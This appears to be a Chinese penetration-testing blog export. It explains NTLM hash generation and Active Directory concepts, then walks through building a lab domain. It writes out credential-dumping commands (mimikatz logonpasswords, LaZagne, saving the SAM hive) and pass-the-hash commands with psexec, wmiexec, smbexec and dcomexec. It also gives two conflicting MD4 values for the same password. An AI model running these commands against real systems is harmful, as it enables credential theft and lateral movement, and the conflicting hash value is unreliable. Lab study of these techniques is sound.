<p><code>NT Lan Manager</code>  的协议实现有 <code>Net-NTLMv1</code>  和 <code>Net-NTLMv2</code>  两个版本，两者响应值计算均使用了 <code>NT Hash</code> 。 <code>NTLM Hash</code>  通常是指 Windows 系统下 <code>Security Account Manager</code>  数据库中保存的用户密码的 <code>Hash</code>  值， <code>Windows</code>  本身不保存明文密码，只保留密码的 <code>Hash</code> ，攻击者利用获取到的 <code>NTLM Hash</code>  可进行 <code>PTH攻击</code> 。</p>
<p><strong>NTLM Hash 生成原理</strong></p>
<p>假设明文口令是 &quot; <code>admin</code> &quot;，首先将其进行十六进制转换，结果为&quot; <code>61646d696e</code> &quot;。</p>
<pre><code class="language-ABAP">admin -&gt; hex = 61646d696e
</code></pre>
<p>将其转换成 Unicode 字符串，结果为 &quot; <code>610064006d0069006e00</code> &quot;。</p>
<pre><code class="language-ABAP">61646d696e-&gt; Unicode = 610064006d0069006e00
</code></pre>
<p>对获取的 Unicode 字符串 &quot; <code>610064006d0069006e00</code> &quot;，进行标准 MD4 单向 Hash 运算，得到 128bit 的 Hash 值。</p>
<p>结果为 &quot; <code>c477236e88a7ae62a59e54e444612724</code> &quot;</p>
<p>也就得到了最后的 NTLM Hash。</p>
<pre><code class="language-ABAP">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
</code></pre>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>Description <span class="token operator">=</span> <span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="5"></td><td><pre>NTLM计算过程</pre></td></tr><tr><td data-num="6"></td><td><pre>admin -> hex = 61646d696e</pre></td></tr><tr><td data-num="7"></td><td><pre>61646d696e-> Unicode = 610064006d0069006e00</pre></td></tr><tr><td data-num="8"></td><td><pre>610064006d0069006e00 -> MD4 = 209c6174da490caeb422f3fa5a7ae634</pre></td></tr><tr><td data-num="9"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>Description<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>Password <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Your Password:'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span>Password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16le'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>hash_hex <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'->'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>hash_hex<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126181346891.png" alt="image-20211126181346891" /></p>
<p><strong>NTLM Hash 提取方式</strong></p>
<p><strong>Mimikatz</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmdlbnRpbGtpd2kuY29tL21pbWlrYXR6">官网下载地址链接</span></p>
<p>以管理员身份运行 mimikaz</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token punctuation">:</span><span class="token punctuation">:</span>debug<span class="token comment">#提升权限</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sekurlsa<span class="token punctuation">:</span><span class="token punctuation">:</span>logonpasswords<span class="token comment">#抓取密码</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126195704243.png" alt="image-20211126195704243" /></p>
<p>即可得到相关的 <code>NTLM</code>  信息。</p>
<p><strong>SafetyKatz</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dob3N0cGFjay9zYWZldHlrYXR6">下载地址</span></p>
<p>找了半天也没找到 emmmm，直接用大佬的图了</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126202035735.png" alt="image-20211126202035735" /></p>
<p><strong>LaZagne</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmUvcmVsZWFzZXMv">windows 版下载地址</span></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>lazagne<span class="token punctuation">.</span>exe all</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126202353492.png" alt="image-20211126202353492" /></p>
<p>麻了麻了，下面的就直接丢佬的图了</p>
<p><strong>Reg</strong></p>
<pre><code class="language-ABAP">reg save hklm\sam C:\Users\Administrator\Desktop\sam.hive

reg save hklm\system C:\Users\Administrator\Desktop\system.hive
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126212400035.png" alt="image-20211126212400035" /></p>
<pre><code class="language-ABAP">samdump2 system.hive sam.hive &gt; ntlm_hash.txt

cat ntlm_hash.txt
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126212538247.png" alt="image-20211126212538247" /></p>
<h2 id="0x03-认证过程"><a class="anchor" href="#0x03-认证过程">#</a> <strong>0x03 认证过程</strong></h2>
<p><strong>Windows Challenge/Response 认证过程</strong></p>
<ol>
<li>客户端发送用户名到服务器</li>
<li>客户端对明文口令进行 <code>Hash</code>  处理获得 <code>NTLM Hash</code></li>
<li>服务器生成一个 16 字节的随机数（ <code>Challenge</code> ）发送给客户端</li>
<li>客户端使用 <code>NTLM Hash</code>  对 <code>Challenge</code>  进行加密，加密结果为 <code>Response-C</code> ，然后将结果发送给服务器</li>
<li>服务器通过用户名检索到相对应的 <code>NTLM Hash</code>  并对 <code>Challenge</code>  进行加密得到 <code>Response-S</code> 。</li>
<li>比较 <code>Response-S</code>  和从客户端接收到的 <code>Response-C</code> ，如果一致则认证通过。</li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126212625346.png" alt="image-20211126212625346" /></p>
<h2 id="0x04windows认证过程"><a class="anchor" href="#0x04windows认证过程">#</a> <strong>0x04Windows 认证过程</strong></h2>
<p>一般来说 <code>Winlogon</code>  服务针对本地计算机上的 <code>SAM</code>  安全账户数据库来进行 <code>Windows</code>  凭据验证。通过在登录用户界面上的用户输入等方式收集凭据，本地安全信息如策略设置、账户信息等一般存储在注册表 <code>HKEY_LOCAL_MACHINE\SECURITY</code>  中， <code>SAM</code>  数据库的备份也存在该注册表中。</p>
<p><code>winlogon.exe</code>  是负责管理安全用户交互的可执行文件， <code>Winlogon</code>  服务通过将用户在登录桌面上输入的用户名口令信息通过 <code>Secur32.dll</code>  传递给 <code>LSA</code>  服务后来启动 <code>Windows</code>  操作系统的登录过程。</p>
<p><code>lsass.exe</code>  主要对用户进行身份验证，将用户口令转化为 <code>NTLM Hash</code> ，同时将凭据信息存储在内存中，用户使用该凭据可访问网络资源等。</p>
<p><code>LSA</code>  凭据产生有如下几种情况：</p>
<ol>
<li>远程桌面登录</li>
<li>本地登录</li>
<li>使用 RunAs 运行服务</li>
<li>运行计划任务或批处理</li>
<li>利用远程管理工具在本地计算机运行服务</li>
</ol>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126203017185.png" alt="image-20211126203017185" /></p>
<h2 id="0x05-pass-the-hash"><a class="anchor" href="#0x05-pass-the-hash">#</a> <strong>0x05 Pass The Hash</strong></h2>
<p><strong>PASXEC</strong></p>
<pre><code class="language-ABAP">PsExec.exe \\target_ip -u username -p password cmd

PsExec.exe \\192.168.1.6 -u administrator -p Abcd1234 cmd.exe
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126203636557.png" alt="image-20211126203636557" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126203750844.png" alt="image-20211126203750844" /></p>
<p><strong>WMIEXEC</strong></p>
<pre><code class="language-ABAP">cscript.exe wmiexec.vbs /cmd domain_name username password cmd

cscript.exe wmiexec.vbs /cmd WIN-78L42RBHLLO administrator admin123!@# &quot;ipconfig&quot;
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126203831897.png" alt="image-20211126203831897" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126203856230.png" alt="image-20211126203856230" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126204016721.png" alt="image-20211126204016721" /></p>
<p><strong>ATEXEC</strong></p>
<pre><code class="language-ABAP">python atexec.py administrator:admin123!@#@192.168.3.133 ipconfig
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126204207214.png" alt="image-20211126204207214" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126204217289.png" alt="image-20211126204217289" /></p>
<p><strong>SMBEXEC</strong></p>
<pre><code class="language-ABAP">python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.3.133


</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126204239779.png" alt="image-20211126204239779" /></p>
<p><strong>DCOMEXEC</strong></p>
<pre><code class="language-ABAP">python dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.3.133
</code></pre>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126204259777.png" alt="image-20211126204259777" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>咱就是这些工具都还在么？？？？咋一个个都找到 wuwuwuwu！！！</p>
<p><strong>参考文章</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYmktalNtUlJ2bzc3N1dqTnJVTTdPUQ==">工作组环境中进行内网渗透常见方法总结</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域的相关概念及配置</title>
    <url>/article/86d50ac0.html</url>
    <content><![CDATA[<h3 id="内网机结构"><a class="anchor" href="#内网机结构">#</a> 内网机结构</h3>
<h4 id="00x01工作组work-group"><a class="anchor" href="#00x01工作组work-group">#</a> 00x01 工作组（Work Group）</h4>
<p><strong>工作组</strong>是局域网中的一个概念，它是最常见的资源管理模式，简单是因为默认情况下计算机都是采用工作组方式进行资源管理的。将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p>默认情况下所有计算机都处在名为 WORKGROUP 的工作组中，工作组资源管理模式适合于网络中计算机不多，对管理要求不严格的情况。它的建立步骤简单，使用起来也很好上手。大部分中小公司都采取工作组的方式对资源进行权限分配和目录共享。相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是 Users 目录。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是<strong>对等的</strong>，也就是没有服务器和客户机之分的。</p>
<h4 id="00x02域domain"><a class="anchor" href="#00x02域domain">#</a> 00x02 域（Domain）</h4>
<p><strong>域</strong>：用来描述一种架构，和 “工作组” 相对应，由工作组升级而来的高级架构，域 (Domain) 是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。</p>
<p>可以简单的把域理解成升级版的 “工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</p>
<p><strong>域的功能和特点：</strong></p>
<ul>
<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
<li>便捷的资源访问，能够很容易地定位到域中的资源。用户依次登录就可以访问整个网络资源，集中地身份验证</li>
<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
</ul>
<h5 id="一-域控制器domain-controller"><a class="anchor" href="#一-域控制器domain-controller">#</a> 一、域控制器（Domain Controller）</h5>
<p>简写为  <code>DC</code> ，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
<p>而要想实现域环境，就必须要计算机中安装活动目录（AD），也可以说如果在内网中的一台计算机上安装了活动目录（AD），那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
<p>一个域中可能应该要有至少两个域控。一个作为 DC，一个是备份 DC。如果没有第二个备份 DC，那么一旦 DC 瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在 DC 中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的 DC 恢复了就行了。</p>
<h5 id="二-父域和子域"><a class="anchor" href="#二-父域和子域">#</a> 二、父域和子域</h5>
<p>第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。</p>
<p>形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
<p><strong>父域与子域之间默认建立起了双向信任关系</strong>。</p>
<h5 id="三-域树"><a class="anchor" href="#三-域树">#</a> 三、域树</h5>
<p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个 “.” 代表一个层次，如域 <code>child.Microsoft.com</code>  就比  <code>Microsoft.com</code>  这个域级别低，因为它有两个层次关系，而 <code>Microsoft.com</code>  只有一个层次。</p>
<p>而域 <code>Grandchild.Child.Microsoft.com</code>  又比  <code>Child.Microsoft.com</code>  级别低，道理一样。他们都属于同一个域树。 <code>Child.Microsoft.com</code>  就属于 <code>Microsoft.com</code>  的子域。</p>
<p>多个域树可以组成一个域林。</p>
<p><strong>建立域树的好处：</strong></p>
<ul>
<li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li>
<li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li>
<li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理</li>
</ul>
<p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p>
<h5 id="四-域林"><a class="anchor" href="#四-域林">#</a> 四、域林</h5>
<p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过 Kerberos 信任关系建立起来，所以每个域树都知道 <code>Kerberos</code>  信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
<p>比如 <code>benet.com.cn</code> , 则可以创建同属与一个林的 <code>accp.com.cn</code> , 他们就在同一个域林里.</p>
<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125162247068.png" alt="image-20211125162247068" /></p>
<p><strong>域信任关系</strong></p>
<p>域之间的信任关系，相当于是不同域之间沟通的桥梁。域信任分为 单向信任 和 双向信任。单向信任只能是受信任域访问信任域，而信任域不能访问受信任域。双向信任是两个域可以互相访问。</p>
<ul>
<li>** 父子信任：** 父域与子域之间自动建立起了双向信任关系，并且信任关系可以传递。</li>
<li>** 树信任：** 同一个林中，林根域与其他树根域自动建立双向信任关系。信任关系可传递。</li>
<li><strong>快捷方式信任</strong>：为了加速认证流程而产生的信任关系。需要管理员手工建立，信任关系可向下传递。</li>
<li>** 林信任：** 在不更改 AD 结构的情况下，让不同林之间可以相互访问资源。信任关系可向下传递。</li>
<li>** 外部信任 / 跨林快捷方式信任：** 类似于同林内的快捷方式信任。单向，信任关系不可传递：</li>
<li>** 领域信任：** 为了让 AD 跟非 windows 系统的 kerberos 建立关系而存在的信任。</li>
</ul>
<h4 id="00x03活动目录"><a class="anchor" href="#00x03活动目录">#</a> 00x03 活动目录</h4>
<p>活动目录 AD 是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有 AD 活动目录的服务器就是域控 DC。</p>
<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件 NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
<p><strong>NTDS.dit</strong></p>
<p>域用户帐户以域数据库的形式保存在活动目录中，NTDS.dit 是活动目录的数据库文件，该文件记录的信息有以下三张表：</p>
<ul>
<li>Schema 表 ：这个表中包含了所有可在活动目录创建的对象信息以及他们之间的相互关系。包括各种类型对象的可选及不可选的各种属性。这个表是活动目录数据库中最小的一个表，但是也是最基础的一个表。</li>
<li>Link 表 ：Link 表包含所有属性的关联，包括活动目录中所有对象的属性的值。一个用户对象的所有属性的类型，包括每个属性的值及用户所属于的组等信息都属于这个表。这个表要大于 Schema 表，但与 Data 表相比要小。</li>
<li>Data 表：活动目录中用户，组，应用程序特殊数据和其他的数据全部保存在 Data 表中。这是活动目录中存储信息最多的一个表，大量的活动目录的资料实际上还是存储在这个表中。</li>
</ul>
<p><strong>Ntdsutil.exe</strong></p>
<p>ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有的域用户信息。以下命令必须在域控上执行：</p>
<p><strong>逻辑结构</strong></p>
<p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为 “ <strong>逻辑结构</strong> ”。<br />
活动目录的逻辑结构就包括上面讲到的 组织单元（ OU ）、域（ domain ）、域树（ tree ）、域森林（ forest ） 。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p>
<p><strong>活动目录的主要功能</strong></p>
<ul>
<li>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名 / 重置密码。</li>
<li>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
<li>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP/IP 等设置。</li>
<li>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
<li>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</li>
<li>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务都依赖于这个基础平台。</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211125213918744-1032164649.png" alt="image-20211125162522836" /></p>
<ul>
<li>Builtin 容器：Builtin 容器是 Active Driectory 默认创建的第一个容器，主要用于保存域中本地安全组。</li>
<li>Computers 容器：Computers 容器是 Active Driectory 默认创建的第 2 个容器，用于存放 Windows Server 2008 域内所有成员计算机的计算机账号。</li>
<li>Domain Controllers 容器：Domain Controllers 是一个特殊的容器，主要用于保存当前域控制器下创建的所有子域和辅助域。</li>
<li>Users 容器：Users 容器主要用于保存安装 Active Driectory 时系统自动创建的用户和登录到当前域控制器的所有用户账户。</li>
</ul>
<h4 id="00x04dmz"><a class="anchor" href="#00x04dmz">#</a> 00x04DMZ</h4>
<p>DMZ  <code>demilitarized zone</code>  ，中文名为 “隔离区”，或称 “非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125162649535.png" alt="image-20211125162649535" /></p>
<h4 id="00x05域内的各种权限"><a class="anchor" href="#00x05域内的各种权限">#</a> 00x05 域内的各种权限</h4>
<p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
<p><strong>域本地组</strong></p>
<p>成员范围：所有的域；使用范围：自己所在的域</p>
<p><strong>全局组</strong></p>
<p>成员范围：自己所在的域；使用范围：所有的域</p>
<p><strong>通用组</strong></p>
<p>成员范围：所有的域；使用范围：所有的域</p>
<p><strong>A-G-DL-P 策略</strong></p>
<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<h3 id="域环境搭建"><a class="anchor" href="#域环境搭建">#</a> 域环境搭建</h3>
<p>所用虚拟镜像</p>
<pre><code class="language-ABAP">win7专业版
windows server 2012 R2
cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598
</code></pre>
<h4 id="环境描述"><a class="anchor" href="#环境描述">#</a> 环境描述</h4>
<p>使用的是 Parallels Desktop 虚拟机。统一使用 NAT 网络模式并可以访问外网。</p>
<pre><code class="language-ABAP"> windows server 2012 R2 : 10.211.55.12 域控
 windows server 2008 R2：10.211.55.8  域用户
 windows 7 ：10.211.55.7 域用户
 子网掩码：10.211.55.1
 DNS服务器：
 首选DNS：10.211.55.12
 备用DNS：202.102.154.3
</code></pre>
<h4 id="server2012域控"><a class="anchor" href="#server2012域控">#</a> server2012 域控</h4>
<h5 id="设置计算机名并设置静态ip地址"><a class="anchor" href="#设置计算机名并设置静态ip地址">#</a> 设置计算机名并设置静态 IP 地址</h5>
<p>修改计算机名为 Server2012</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125639375746.png" alt="img" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125639375747.png" alt="img" /></p>
<h5 id="安装dns服务"><a class="anchor" href="#安装dns服务">#</a> 安装 DNS 服务</h5>
<p>点击 &quot;添加用户和功能&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163407601.png" alt="image-20211125163407601" /></p>
<p>一直默认点击下一步<br />
选择安装 &quot;DNS 服务器&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163511062.png" alt="image-20211125163511062" /></p>
<p>继续默认下一步<br />
最后确认安装。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163606440.png" alt="image-20211125163606440" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163636343.png" alt="image-20211125163636343" /></p>
<p>安装成功后，仪表盘会显示 DNS</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163636344.png" alt="img" /></p>
<h5 id="安装active-directory域服务"><a class="anchor" href="#安装active-directory域服务">#</a> 安装 Active Directory 域服务</h5>
<p>与安装 DNS 相似，添加 Active Directory 域服务</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163850677.png" alt="image-20211125163850677" /></p>
<p>一路默认安装即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125163937573.png" alt="image-20211125163937573" /></p>
<p>安装成功后，仪表盘可看到 AD DS</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-2021112563937574.png" alt="img" /></p>
<h4 id="升级域环境"><a class="anchor" href="#升级域环境">#</a> 升级域环境</h4>
<p>选择 AD DS 服务，点击更多，单击 &quot;将此服务器升为域控制器&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125639375745.png" alt="img" /></p>
<p>进入 &quot;Active Directory 域服务配置向导&quot; 界面<br />
选择 &quot;添加新林&quot;，输入根域名 &quot;<span class="exturl" data-url="aHR0cDovLzIxcjAwMC5vcmc=">21r000.org</span>&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125164518359.png" alt="image-20211125164518359" /></p>
<p>&quot;林功能级别&quot;、&quot;域功能级别&quot; 都设置为 &quot;Windows Server 2012 R2&quot;<br />
设置域还原密码&quot;21r000@666&quot;，当域控出现问题，可以用该密码还原数据。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125164640087.png" alt="image-20211125164640087" /></p>
<p>在 &quot;DNS 选项&quot;，出现 DNS 警告，保持默认即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125164703100.png" alt="image-20211125164703100" /></p>
<p>保持默认即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125164808364.png" alt="image-20211125164808364" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125164922303.png" alt="image-20211125164922303" /></p>
<p>建议使用网络用户命令行工具的 /passwordreq:yes 选项获得该账户密码</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125165015500.png" alt="image-20211125165015500" /></p>
<p>以管理员身份运行 cmd，运行一下命令</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Start-Process powershell -Verb runAs <span class="token comment">#进入管理员模式</span></pre></td></tr><tr><td data-num="2"></td><td><pre>net user administrator 21r000@2012  <span class="token comment">#设置密码</span></pre></td></tr><tr><td data-num="3"></td><td><pre>net user administrator /passwordreq:yes</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125165542115.png" alt="image-20211125165542115" /></p>
<p>即可通过检查</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125165656220.png" alt="image-20211125165656220" /></p>
<p>安装后系统会自动重启。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125170739224.png" alt="image-20211125170739224" /></p>
<p>出现域信息，成功安装。</p>
<h5 id="创建active-directory用户"><a class="anchor" href="#创建active-directory用户">#</a> 创建 Active Directory 用户</h5>
<p>选择工具 ---Active Directory 用户和计算机</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125170859662.png" alt="image-20211125170859662" /></p>
<p>选择 users，右键单击</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125171132481.png" alt="image-20211125171132481" /></p>
<p>新建用户</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125171300132.png" alt="image-20211125171300132" /></p>
<p>设置密码 <code>21r000@666</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125171400687.png" alt="image-20211125171400687" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125171442655.png" alt="image-20211125171442655" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211125171504171.png" alt="image-20211125171504171" /></p>
<h4 id="win7域环境搭建"><a class="anchor" href="#win7域环境搭建">#</a> WIN7 域环境搭建</h4>
